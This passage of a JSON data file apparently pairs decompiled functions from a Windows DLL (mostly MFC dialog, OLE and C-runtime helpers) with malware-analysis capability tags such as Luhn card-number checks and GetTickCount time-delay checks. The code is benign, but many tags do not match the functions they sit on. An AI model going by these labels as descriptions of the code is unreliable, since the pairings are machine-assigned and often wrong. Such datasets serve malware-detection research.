        "decompiled_code": "\nvoid fcn.18003279c(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    if (arg2 < 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (-1 < arg3) {\n        *(arg1 + 0x20) = arg3;\n    }\n    iVar5 = *(arg1 + 8);\n    if (arg2 == 0) {\n        fcn.1800096a4(iVar5);\n        *(arg1 + 8) = 0;\n        *(arg1 + 0x18) = 0;\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        if (iVar5 == 0) {\n            arg1_00 = fcn.180009660(arg2 << 3);\n            *(arg1 + 8) = arg1_00;\n            fcn.180033c90(arg1_00, 0, arg2 << 3);\n            *(arg1 + 0x18) = arg2;\n        }\n        else {\n            iVar1 = *(arg1 + 0x18);\n            if (iVar1 < arg2) {\n                iVar5 = *(arg1 + 0x20);\n                if (*(arg1 + 0x20) == 0) {\n                    iVar4 = *(arg1 + 0x10) + (*(arg1 + 0x10) >> 0x3f & 7) >> 3;\n                    if (((iVar4 < 4) || (iVar5 = 0x400,  iVar4 < 0x401)) && (iVar5 = iVar4,  iVar4 < 4)) {\n                        iVar5 = 4;\n                    }\n                }\n                iVar4 = arg2;\n                if (arg2 < iVar5 + iVar1) {\n                    iVar4 = iVar5 + iVar1;\n                }\n                if (iVar4 < iVar1) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                iVar5 = fcn.180009660(iVar4 << 3);\n                iVar3 = fcn.180034220(iVar5, iVar4 << 3, *(arg1 + 8), *(arg1 + 0x10) << 3);\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.180033c90(iVar5 + *(arg1 + 0x10) * 8, 0, (arg2 - *(arg1 + 0x10)) * 8);\n                fcn.1800096a4(*(arg1 + 8));\n                *(arg1 + 8) = iVar5;\n                *(arg1 + 0x18) = iVar4;\n            }\n            else {\n                iVar1 = *(arg1 + 0x10);\n                if (iVar1 < arg2) {\n                    fcn.180033c90(iVar5 + iVar1 * 8, 0, (arg2 - iVar1) * 8);\n                }\n            }\n        }\n        *(arg1 + 0x10) = arg2;\n    }\n    return;\n}\n",
        "token_count": 887
    },
    "180032b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180032b1c(int64_t arg1, int64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    if ((arg2 < 0) || (arg4 < 1)) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg2 < *(arg1 + 0x10)) {\n        iVar1 = *(arg1 + 0x10);\n        fcn.18003279c(arg1, iVar1 + arg4, 0xffffffffffffffff);\n        iVar3 = fcn.180033080(*(arg1 + 8) + (arg2 + arg4) * 8, ((*(arg1 + 0x10) - arg2) - arg4) * 8, \n                              *(arg1 + 8) + arg2 * 8, (iVar1 - arg2) * 8);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.180033c90(*(arg1 + 8) + arg2 * 8, 0, arg4 << 3);\n    }\n    else {\n        fcn.18003279c(arg1, arg2 + arg4, 0xffffffffffffffff);\n    }\n    arg2 = arg2 << 3;\n    do {\n        *(arg2 + *(arg1 + 8)) = arg3;\n        arg2 = arg2 + 8;\n        arg4 = arg4 + -1;\n    } while (arg4 != 0);\n    return;\n}\n",
        "token_count": 499
    },
    "180032ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180032ce0(code **arg1, ulong arg2)\n\n{\n    fcn.180011510(arg1, 0, arg2);\n    *(arg1 + 0x1d) = 0xffffffff;\n    *arg1 = vtable.CCommonDialog.0;\n    return arg1;\n}\n",
        "token_count": 71
    },
    "180032d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180032d10(code **arg1, code *arg2, ulong arg3, ulong arg4)\n\n{\n    ulong in_stack_00000028;\n    \n    fcn.180032ce0(arg1, in_stack_00000028);\n    *arg1 = vtable.COleBusyDialog.0;\n    fcn.180033c90(arg1 + 0x1e, 0, 0x50);\n    *(arg1 + 0x1e) = 0x50;\n    *(arg1 + 0xf4) = arg4;\n    if (arg3 != 0) {\n        *(arg1 + 0xf4) = arg4 | 8;\n    }\n    arg1[0x26] = arg2;\n    arg1[0x21] = 0x180032c90;\n    return arg1;\n}\n",
        "token_count": 191
    },
    "180032db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180032dbc(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint uVar3;\n    int64_t iStackX8;\n    \n    if (*(arg1 + 0xd0) == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(*(arg1 + 0xd0) + 0x40);\n    }\n    uVar2 = fcn.18000ed24(uVar2, &iStackX8);\n    *(arg1 + 0xf8) = uVar2;\n    fcn.180019f48(arg1);\n    iVar1 = sub.oledlg.dll_OleUIBusyW(arg1 + 0xf0);\n    fcn.180017d54();\n    fcn.180017d08(arg1);\n    if (iStackX8 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStackX8, 1);\n    }\n    uVar2 = 2;\n    if (iVar1 != 2) {\n        if (iVar1 == 0x75) {\n            *(arg1 + 0x140) = 1;\n        }\n        else if (iVar1 == 0x76) {\n            *(arg1 + 0x140) = 2;\n        }\n        else if (iVar1 == 0x77) {\n            *(arg1 + 0x140) = 3;\n        }\n        else {\n            *(arg1 + 0xe8) = iVar1;\n            uVar3 = 0xffffffff;\n            if (iVar1 == 1) {\n                uVar3 = 1;\n            }\n            *(arg1 + 0x140) = uVar3;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 403
    },
    "18003341": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180033414(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    ulong uStack56;\n    uint uStack48;\n    ulong uStack40;\n    uint uStack32;\n    \n    if (arg1 == 0) {\n        puVar1 = fcn.180035b28();\n        *puVar1 = 0x16;\n        fcn.180036f3c(0, 0, 0, 0);\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uStack40 = 0;\n        uStack56 = 0;\n        uStack48 = 0x7fffffff;\n        uStack32 = 0x42;\n        uVar2 = (*0x180037fa0)(&uStack56);\n    }\n    return uVar2;\n}\n",
        "token_count": 190
    },
    "18003385": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180033854(ulong arg1)\n\n{\n    ulong arg1_00;\n    \n    if (*0x18006de08 == 0) {\n        arg1_00 = 0x180068bc0;\n    }\n    else {\n        arg1_00 = 0;\n    }\n    fcn.180038dc4(arg1_00, arg1, 0, 10);\n    return;\n}\n",
        "token_count": 92
    },
    "18003729": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180037290(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.180035b28();\n        *puVar1 = 0x16;\n        fcn.180036f3c(0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x180067e94;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 127
    },
    "1800372d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800372d0(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.180035b28();\n        *puVar1 = 0x16;\n        fcn.180036f3c(0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x180067e98;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 129
    },
    "18003731": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180037310(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.180035b28();\n        *puVar1 = 0x16;\n        fcn.180036f3c(0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x180067e90;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 127
    },
    "18003d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003d808(void)\n\n{\n    code **ppcVar1;\n    \n    for (ppcVar1 = 0x18005c0b8; ppcVar1 < 0x18005c0b8; ppcVar1 = ppcVar1 + 1) {\n        if (*ppcVar1 != NULL) {\n            (**ppcVar1)();\n        }\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "18003edd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.18003edd4(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    if (arg1 == 0) {\n        fcn.1800367bc();\n    }\n    uVar1 = *(arg1 + 0x14);\n    if (*(arg1 + 0x18) + *(arg2 + 8) == 0) {\n        fcn.1800367bc();\n    }\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        iVar2 = *(arg2 + 8);\n        piVar4 = iVar2 + *(arg1 + 0x18);\n        do {\n            if (arg3 < *piVar4 + iVar2) break;\n            uVar3 = uVar3 + 1;\n            piVar4 = piVar4 + 2;\n        } while (uVar3 < uVar1);\n        if (uVar3 != 0) {\n            return *(*(arg1 + 0x18) + (uVar3 - 1) * 8 + 4 + iVar2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 286
    },
    "18004792": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18004792c(ulong lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return 0;\n}\n",
        "token_count": 34
    },
    "18004798": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.180047988(uint *arg1)\n\n{\n    int32_t iVar1;\n    \n    fcn.180033c90(arg1 + 10, 0, 0x28);\n    *(arg1 + 0x14) = 0;\n    arg1[0x16] = 0;\n    arg1[0x17] = 0;\n    *(arg1 + 4) = 0x180000000;\n    *(arg1 + 2) = 0x180000000;\n    *arg1 = 0x60;\n    arg1[6] = 0x900;\n    *(arg1 + 8) = 0x180056800;\n    iVar1 = fcn.18004792c(arg1 + 10);\n    if (iVar1 < 0) {\n        *0x18006e2f0 = 1;\n    }\n    return arg1;\n}\n",
        "token_count": 202
    },
    "18003300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.18003300c(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180032f04(arg1);\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 53
    },
    "18000121": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180001214(ulong arg1)\n\n{\n    code *pcVar1;\n    \n    if (arg1 == -0x7ff8fff2) {\n        fcn.1800124cc();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.180014130(arg1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 98
    },
    "18000b11": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18000b11c(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong in_stack_00000028;\n    int64_t in_stack_00000030;\n    uint32_t in_stack_00000038;\n    ushort auStack136 [16];\n    ulong uStack104;\n    uchar auStack96 [24];\n    uchar auStack72 [24];\n    uchar auStack48 [24];\n    \n    uStack104 = 0xfffffffffffffffe;\n    iVar2 = 0;\n    if ((arg2 != 0) && (iVar2 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(arg2),  iVar2 == 0)) {\n        fcn.180001214(0x8007000e);\n    }\n    fcn.18001d3c0(auStack136);\n    auStack136[0] = 0;\n    if (in_stack_00000030 != 0) {\n        if (in_stack_00000038 == 0) {\n            in_stack_00000038 = (*_sym.imp.KERNEL32.dll_lstrlenW)(in_stack_00000030);\n        }\n        fcn.18001d82c(auStack136, 0x11, in_stack_00000038, in_stack_00000030);\n    }\n    piVar1 = *(arg1 + 0x110);\n    uVar3 = fcn.18001daf0(auStack72, in_stack_00000028);\n    uVar4 = fcn.18001daf0(auStack96, arg4);\n    uVar5 = fcn.18001d2f8(auStack48, arg3 & 0xffffffff);\n    (**(*piVar1 + 0x58))(piVar1, iVar2, uVar5, uVar4, auStack136, uVar3);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack48);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack96);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack72);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack136);\n    (*_sym.imp.OLEAUT32.dll_SysStringLen)(iVar2);\n    return;\n}\n",
        "token_count": 543
    },
    "18000cfb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nushort * fcn.18000cfb8(ulong arg1, ushort *arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piStackX16;\n    ulong uStack32;\n    ulong uStack24;\n    uint uStack16;\n    uint uStack12;\n    \n    piStackX16 = NULL;\n    *arg2 = 0;\n    fcn.18000cc2c(arg1, arg3, &piStackX16, 0);\n    piVar1 = piStackX16;\n    if (piStackX16 != NULL) {\n        uStack32 = 0;\n        uStack24 = 0;\n        uStack16 = 0;\n        uStack12 = 0;\n        (**(*piStackX16 + 0x30))(piStackX16, arg4, 0x180056038, 0x400, 2, &uStack32, arg2, 0, 0);\n        (**(*piVar1 + 0x10))(piVar1);\n    }\n    return arg2;\n}\n",
        "token_count": 241
    },
    "18001b50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.18001b500(int64_t arg1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint64_t arg3;\n    uchar auStack104 [96];\n    \n    uVar6 = *(arg1 + 0x40);\n    iVar2 = fcn.180015c20(*(arg1 + 0x18), uVar6, auStack104);\n    arg3 = 0;\n    if (iVar2 == 0) {\n        iVar1 = fcn.180015b84(arg1);\n        if (iVar1 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            iVar4 = fcn.180014058();\n            if (*(iVar4 + 0x28) != '\\0') {\n                fcn.18001ca7c(1, uVar6);\n                iVar5 = fcn.180014058();\n                iVar4 = *(arg1 + 0x40);\n                if (iVar4 != 0) {\n                    uVar3 = fcn.180033b84(iVar4);\n                    arg3 = uVar3;\n                }\n                fcn.180008f94(iVar5 + 0x58, iVar4, arg3);\n                fcn.180014270(iVar5 + 0x58);\n                int.18001cb10(1);\n            }\n            uVar6 = 1;\n        }\n    }\n    else {\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 356
    },
    "18002ce3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18002ce38(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    char16_t *arg2;\n    uchar auStack168 [32];\n    int32_t aiStack136 [7];\n    char16_t acStack108 [34];\n    uint64_t uStack40;\n    \n    uStack40 = *0x180067ce0 ^ auStack168;\n    arg2 = L\"System\";\n    iVar3 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (((iVar3 != 0) || (iVar3 = (*_sym.imp.GDI32.dll_GetStockObject)(0xd),  iVar3 != 0)) &&\n       (iVar1 = (*_sym.imp.GDI32.dll_GetObjectW)(iVar3, 0x5c, aiStack136),  iVar1 != 0)) {\n        arg2 = acStack108;\n        uVar4 = (*_sym.imp.USER32.dll_GetDC)();\n        if (aiStack136[0] < 0) {\n            aiStack136[0] = -aiStack136[0];\n        }\n        uVar2 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar4, 0x5a);\n        (*_sym.imp.KERNEL32.dll_MulDiv)(aiStack136[0], 0x48, uVar2);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar4);\n    }\n    fcn.18002cc84(arg1, arg2);\n    fcn.180032ea0(uStack40 ^ auStack168);\n    return;\n}\n",
        "token_count": 368
    },
    "18000fe8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.18000fe88(code **arg1)\n\n{\n    ulong *puVar1;\n    \n    *arg1 = vtable.CList_class_IControlSiteFactory____ptr64__class_IControlSiteFactory____ptr64_.0;\n    for (puVar1 = arg1[1]; puVar1 != NULL; puVar1 = *puVar1) {\n    }\n    arg1[3] = NULL;\n    arg1[4] = NULL;\n    arg1[2] = NULL;\n    arg1[1] = NULL;\n    fcn.18002a100(arg1[5]);\n    arg1[5] = NULL;\n    return;\n}\n",
        "token_count": 144
    },
    "18001d3b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180033cb0)\n// WARNING: Removing unreachable block (ram,0x000180033cb8)\n// WARNING: Removing unreachable block (ram,0x000180033cbe)\n// WARNING: Removing unreachable block (ram,0x000180033d07)\n// WARNING: Removing unreachable block (ram,0x000180033d40)\n// WARNING: Removing unreachable block (ram,0x000180033d70)\n// WARNING: Removing unreachable block (ram,0x000180033d10)\n// WARNING: Removing unreachable block (ram,0x000180033d38)\n// WARNING: Removing unreachable block (ram,0x000180033cf1)\n\nvoid fcn.18001d3b4(ulong *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = 3;\n    do {\n        *arg1 = 0;\n        arg1 = arg1 + 1;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 231
    },
    "18002d0d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.18002d0d8(int64_t arg1, uint64_t arg2, uint *arg3, uint *arg4)\n\n{\n    uint64_t uVar1;\n    ulong *puVar2;\n    \n    *arg4 = arg2 >> 4;\n    uVar1 = (arg2 >> 4 & 0xffffffff) % *(arg1 + 0x10);\n    *arg3 = uVar1;\n    if (*(arg1 + 8) != 0) {\n        for (puVar2 = *(*(arg1 + 8) + uVar1 * 8); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == arg2) {\n                return puVar2;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 181
    },
    "18002d67": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.18002d67c(int64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    if (arg3 == NULL) {\n        arg3 = *(arg1 + 8);\n    }\n    else {\n        arg3 = *arg3;\n    }\n    for (; (arg3 != NULL && (arg3[2] != arg2)); arg3 = *arg3) {\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "18003ee6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.18003ee60(int64_t arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    iVar3 = *arg2;\n    if (arg1 == 0) {\n        fcn.1800367bc();\n    }\n    uVar1 = *(arg1 + 0x14);\n    if (*(arg1 + 0x18) + arg2[1] == 0) {\n        fcn.1800367bc();\n    }\n    uVar4 = 0;\n    if (uVar1 != 0) {\n        iVar2 = arg2[1];\n        piVar5 = iVar2 + *(arg1 + 0x18);\n        do {\n            if (iVar3 < *piVar5 + iVar2) break;\n            uVar4 = uVar4 + 1;\n            piVar5 = piVar5 + 2;\n        } while (uVar4 < uVar1);\n        if (uVar4 != 0) {\n            return *(*(arg1 + 0x18) + (uVar4 - 1) * 8 + 4 + iVar2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 292
    },
    "18004227": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018004220e)\n// WARNING: Removing unreachable block (ram,0x000180042213)\n// WARNING: Removing unreachable block (ram,0x000180042219)\n// WARNING: Removing unreachable block (ram,0x000180042221)\n// WARNING: Removing unreachable block (ram,0x000180042225)\n\nint32_t fcn.180042274(ulong noname_0, ulong arg2)\n\n{\n    int64_t arg1;\n    int32_t iVar1;\n    int64_t lpCriticalSection;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    iVar3 = 0;\n    fcn.180040568(1, arg2);\n    for (uVar2 = 0; uVar2 < *0x18006f6c0; uVar2 = uVar2 + 1) {\n        iVar4 = uVar2;\n        if ((*(*0x18006e6a0 + iVar4 * 8) != 0) &&\n           (lpCriticalSection = *(*0x18006e6a0 + iVar4 * 8),  (*(lpCriticalSection + 0x18) & 0x83) != 0)) {\n            fcn.180039e60(uVar2, lpCriticalSection);\n            arg1 = *(*0x18006e6a0 + iVar4 * 8);\n            if (((*(arg1 + 0x18) & 0x83) != 0) && (iVar1 = fcn.180042138(arg1, lpCriticalSection),  iVar1 != -1)) {\n                iVar3 = iVar3 + 1;\n            }\n            fcn.180039ee8(uVar2, *(*0x18006e6a0 + iVar4 * 8));\n        }\n    }\n    fcn.180040468(1);\n    return iVar3;\n}\n",
        "token_count": 419
    }
}